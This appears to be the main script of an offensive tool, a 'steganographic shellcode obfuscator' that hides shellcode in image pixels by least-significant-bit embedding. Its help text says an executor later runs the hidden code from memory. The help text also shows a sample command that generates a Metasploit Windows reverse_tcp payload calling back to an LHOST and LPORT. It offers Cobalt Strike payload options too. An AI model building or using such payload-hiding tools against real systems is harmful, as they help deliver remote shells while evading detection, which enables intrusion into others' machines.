"""
C implementation reads pixels left to right, top to bottom
Python implementation reads pixels left to right, bottom to top!
"""
import argparse
import os

from PIL import Image
from bitarray import bitarray

import shellcode
from algorithms import LSB

ALGORITHMS = ['LSB']


def save_encoded_image(source_file: str, dest_file: str, payload_bytes: bytes):
    payload = bitarray()
    payload.frombytes(payload_bytes)

    print(len(payload_bytes))

    img = Image.open(source_file)

    LSB.embed_data(img, payload)

    img.save(dest_file)


def read_encoded_image(img_filename: str, max_bits: int) -> bytes:
    img = Image.open(img_filename)

    payload = LSB.extract_data(img, max_bits)
    return payload.tobytes()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='A steganographic shellcode obfuscator. '
                    'The executor reads data from an image and executes it '
                    'using VirtualAlloc/HeapAlloc. '
    )

    shellcode_source = parser.add_mutually_exclusive_group(required=True)
    shellcode_source.add_argument('-f', dest='sc_file', type=str, help='Shellcode file')
    shellcode_source.add_argument('--sc', dest='sc', type=os.fsencode,
                                  help='Shellcode encoded as Python bytes.\n'
                                       'Pass \'-\' to read shellcode from stdin.\n'
                                       'Use msf:// to generate an MSF payload automatically\n'
                                       'pass the options in the custom_options arg:\n'
                                       'python main.py --sc msf://windows/reverse_tcp -i ... -o ... -- LHOST=1.1.1.1 LPORT=4444'
                                  )

    parser.add_argument('-i', dest='src', type=str, help='Source image', required=True)
    parser.add_argument('-o', dest='dst', type=str, help='Destination image', required=True)

    parser.add_argument('-a', dest='algorithm', type=str,
                        help=f'Algorithm to use. Available options: {", ".join(ALGORITHMS)}')

    parser.add_argument('custom_options', type=str, nargs='*',
                        help='Options used when generating a Cobalt or MSF payload')

    args = parser.parse_args()

    sc = shellcode.from_args(args)

    save_encoded_image(args.src, args.dst, sc)
    payload = read_encoded_image(args.dst, 5737 * 8)
    print(payload)
